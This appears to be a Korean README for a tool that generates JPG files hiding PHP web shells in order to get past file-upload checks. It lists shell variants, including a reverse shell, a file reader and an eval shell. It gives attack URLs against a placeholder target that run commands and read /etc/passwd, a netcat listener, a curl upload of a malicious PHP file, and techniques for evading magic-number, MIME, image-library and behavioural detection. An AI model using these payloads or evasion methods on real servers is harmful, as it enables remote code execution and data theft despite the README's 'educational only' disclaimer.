# PHP Shell RCE JPG Bypass Payload Generator

JPG 파일 형식을 완벽하게 우회하면서 PHP 코드를 숨기는 고급 페이로드 생성기입니다.

## 🚨 주의사항

**이 도구는 교육 목적으로만 사용하세요.**
- 실제 시스템에서 사용 시 법적 책임이 따를 수 있습니다
- 승인받은 환경에서만 테스트하세요
- 악의적인 목적으로 사용하지 마세요

## 📋 기능

### 기본 우회 기법
- **코멘트 세그먼트 우회**: JPG 코멘트에 PHP 코드 삽입
- **APP 세그먼트 우회**: EXIF 데이터로 위장
- **복합 우회**: 여러 세그먼트에 분산 삽입

### 고급 우회 기법
- **ICC 프로파일 우회**: 압축된 PHP 코드 숨김
- **양자화 테이블 우회**: Base64 인코딩으로 우회
- **허프만 테이블 우회**: XOR 인코딩으로 우회
- **재시작 마커 우회**: 여러 RST 마커에 분산
- **스캔 데이터 우회**: SOS 마커에 숨김
- **폴리글롯 파일**: JPG/PHP 이중 파일 생성

### PHP Shell 종류
- **기본 쉘**: `system()` 함수 사용
- **고급 쉘**: Base64 디코딩 우회
- **은밀 쉘**: 파일 포함 방식
- **파일 업로드 쉘**: 추가 파일 업로드 기능
- **리버스 쉘**: 네트워크 연결 기능
- **파일 읽기 쉘**: 파일 내용 읽기
- **명령 주입 쉘**: 명령어 실행
- **Eval 우회 쉘**: eval() 함수 사용
- **Include 쉘**: 파일 포함 기능

## 🛠️ 설치 및 사용법

### 1. 의존성 설치
```bash
pip3 install pillow python-magic
```

### 2. 기본 페이로드 생성
```bash
python3 php_shell_rce_jpg_bypass.py
```

### 3. 고급 페이로드 생성
```bash
python3 advanced_jpg_bypass.py
```

### 4. 페이로드 테스트
```bash
python3 test_payloads.py
```

## 📁 생성되는 파일들

### 기본 페이로드 (`payloads/`)
- `basic_comment_shell.jpg` - 기본 쉘 (코멘트 우회)
- `basic_app_shell.jpg` - 기본 쉘 (APP 우회)
- `basic_complex_shell.jpg` - 기본 쉘 (복합 우회)
- `advanced_comment_shell.jpg` - 고급 쉘 (코멘트 우회)
- `advanced_app_shell.jpg` - 고급 쉘 (APP 우회)
- `advanced_complex_shell.jpg` - 고급 쉘 (복합 우회)
- `stealth_comment_shell.jpg` - 은밀 쉘 (코멘트 우회)
- `stealth_app_shell.jpg` - 은밀 쉘 (APP 우회)
- `stealth_complex_shell.jpg` - 은밀 쉘 (복합 우회)

### 고급 페이로드 (`advanced_payloads/`)
- `file_upload_icc_profile_bypass.jpg` - 파일 업로드 쉘 (ICC 우회)
- `reverse_shell_quantization_table_bypass.jpg` - 리버스 쉘 (양자화 테이블 우회)
- `file_reader_huffman_table_bypass.jpg` - 파일 읽기 쉘 (허프만 테이블 우회)
- `command_injection_restart_marker_bypass.jpg` - 명령 주입 쉘 (재시작 마커 우회)
- `eval_bypass_scan_data_bypass.jpg` - Eval 우회 쉘 (스캔 데이터 우회)
- `include_bypass_polyglot.jpg` - Include 쉘 (폴리글롯 우회)

### 은밀 페이로드 (`stealth_payloads/`)
- `minimal_shell_stealth.jpg` - 최소한의 쉘
- `no_spaces_stealth.jpg` - 공백 없는 쉘
- `base64_shell_stealth.jpg` - Base64 쉘
- `file_include_stealth.jpg` - 파일 포함 쉘
- `require_once_stealth.jpg` - require_once 쉘
- `create_function_stealth.jpg` - create_function 쉘

## 🎯 사용 예시

### 1. 기본 웹쉘 사용
```bash
# 파일 업로드 후 접근
http://target.com/uploads/basic_comment_shell.jpg?cmd=id
http://target.com/uploads/basic_comment_shell.jpg?cmd=ls -la
http://target.com/uploads/basic_comment_shell.jpg?cmd=cat /etc/passwd
```

### 2. 고급 웹쉘 사용
```bash
# Base64 인코딩된 명령어
http://target.com/uploads/advanced_comment_shell.jpg?c=ZWNobyAiaGVsbG8iOw==

# 파일 읽기
http://target.com/uploads/file_reader_huffman_table_bypass.jpg?f=/etc/passwd

# 파일 포함
http://target.com/uploads/include_bypass_polyglot.jpg?include=config.php
```

### 3. 리버스 쉘 사용
```bash
# 로컬에서 리스닝
nc -lvp 4444

# 웹쉘 접근 (리버스 쉘 실행)
http://target.com/uploads/reverse_shell_quantization_table_bypass.jpg
```

### 4. 파일 업로드 쉘 사용
```bash
# POST 요청으로 파일 업로드
curl -X POST -F "file=@malicious.php" http://target.com/uploads/file_upload_icc_profile_bypass.jpg
```

## 🔍 우회 기법 상세 설명

### 1. JPG 파일 구조
```
FF D8 FF E0 - JPG 시그니처
[APP0 세그먼트] - JFIF 정보
[APP1 세그먼트] - EXIF 데이터
[APP2 세그먼트] - ICC 프로파일
[코멘트 세그먼트] - 코멘트 데이터
[양자화 테이블] - DQT 마커
[허프만 테이블] - DHT 마커
[스캔 데이터] - SOS 마커
FF D9 - JPG 트레일러
```

### 2. 우회 원리
- **시그니처 우회**: 유효한 JPG 시그니처 유지
- **세그먼트 우회**: JPG 세그먼트에 PHP 코드 삽입
- **인코딩 우회**: Base64, XOR, 압축 등으로 숨김
- **폴리글롯**: 여러 파일 형식을 동시에 만족

### 3. 탐지 우회
- **Magic Number**: 파일 시그니처 검증 우회
- **MIME Type**: Content-Type 검증 우회
- **파일 크기**: 정상적인 JPG 파일 크기 유지
- **이미지 검증**: PIL 등 이미지 라이브러리 검증 우회

## 🧪 테스트 방법

### 1. 자동 테스트
```bash
python3 test_payloads.py
```

### 2. 수동 테스트
```bash
# 파일 시그니처 확인
file payloads/basic_comment_shell.jpg

# Magic Number 확인
python3 -c "import magic; print(magic.from_file('payloads/basic_comment_shell.jpg', mime=True))"

# PIL 검증
python3 -c "from PIL import Image; Image.open('payloads/basic_comment_shell.jpg').verify()"

# PHP 코드 확인
strings payloads/basic_comment_shell.jpg | grep -i php
```

### 3. 웹 서버 테스트
```bash
# 테스트 서버 실행
python3 test_server.py

# 파일 업로드 테스트
curl -X POST -F "file=@payloads/basic_comment_shell.jpg" http://localhost:8080

# 웹쉘 테스트
curl "http://localhost:8080/uploads/basic_comment_shell.jpg?cmd=id"
```

## ⚠️ 보안 고려사항

### 1. 탐지 가능성
- 일부 보안 도구가 탐지할 수 있습니다
- 파일 내용 분석으로 발견될 수 있습니다
- 행위 기반 탐지에 걸릴 수 있습니다

### 2. 대응 방안
- **다중 우회**: 여러 기법을 조합하여 사용
- **동적 생성**: 런타임에 페이로드 생성
- **암호화**: 추가적인 암호화 레이어 적용
- **분산 삽입**: 코드를 여러 부분에 분산

### 3. 법적 고려사항
- 교육 목적으로만 사용하세요
- 승인받은 환경에서만 테스트하세요
- 실제 시스템에 대한 무단 접근은 불법입니다

## 📚 참고 자료

- [JPEG File Format](https://en.wikipedia.org/wiki/JPEG_File_Interchange_Format)
- [PHP File Upload Vulnerabilities](https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload)
- [Polyglot Files](https://en.wikipedia.org/wiki/Polyglot_(computing))
- [File Upload Bypass Techniques](https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/File_Upload_Cheat_Sheet.md)

## 🤝 기여

버그 리포트나 개선 제안은 이슈로 등록해주세요.

## 📄 라이선스

이 프로젝트는 교육 목적으로만 제공됩니다. 상업적 사용은 금지됩니다.
